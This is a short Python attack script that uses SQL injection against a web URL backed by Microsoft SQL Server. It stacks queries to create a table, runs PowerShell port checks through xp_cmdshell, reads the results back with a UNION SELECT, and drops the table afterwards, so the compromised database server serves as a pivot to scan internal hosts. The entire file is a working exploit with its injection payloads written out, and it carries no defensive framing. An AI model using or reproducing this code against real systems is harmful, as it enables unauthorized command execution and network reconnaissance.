#!/usr/bin/env python
import argparse
import sys
import requests


def scan_port(url, ip, port):
    is_port_open = False
    try:
        payload = f"{url}';CREATE TABLE intermedia (salida VARCHAR(200));-- -"
        r = requests.get(payload)
        payload = f"{url}';INSERT INTO intermedia EXEC xp_cmdshell 'powershell Test-NetConnection -ComputerName {ip} -Port {port}';-- -"
        r = requests.get(payload)
        payload = f"{url}' UNION SELECT salida, null, null, null FROM intermedia;-- -"
        r = requests.get(payload)
        if "TcpTestSucceeded : True" in r.text:
            is_port_open = True
 
        payload = f"{url}';DROP TABLE intermedia;-- -"
        r = requests.get(payload)
    except requests.exceptions.RequestException:
        pass
    return is_port_open

def scan_ports(url, ip, ports):
    for port in ports:
        print(f'[+] Scanning {ip}:{port}', end='\r')
        if scan_port(url, ip, port):
            print(f' ' * 80, end='\r')
            print(f'[+] {ip}:{port} OPEN')

def parse_ports(arg_ports):
    ports = []
    if args.ports == '-':
        ports = [x for x in range(1, 65536)]
    else:
        for port in args.ports.split(','):
            if '-' in port:
                s, e = [int(x) for x in port.split('-')]
                ports += range(s, e+1)
            else:
                ports.append(int(port))
    return ports

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Perform scan port over mssql')
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-i', '--ip', required=True)
    parser.add_argument('-p', '--ports', required=True)

    args = parser.parse_args()

    try:
        scan_ports(args.url, args.ip, parse_ports(args.ports))
    except KeyboardInterrupt:
        pass
    print('\n[+] Bye bye...')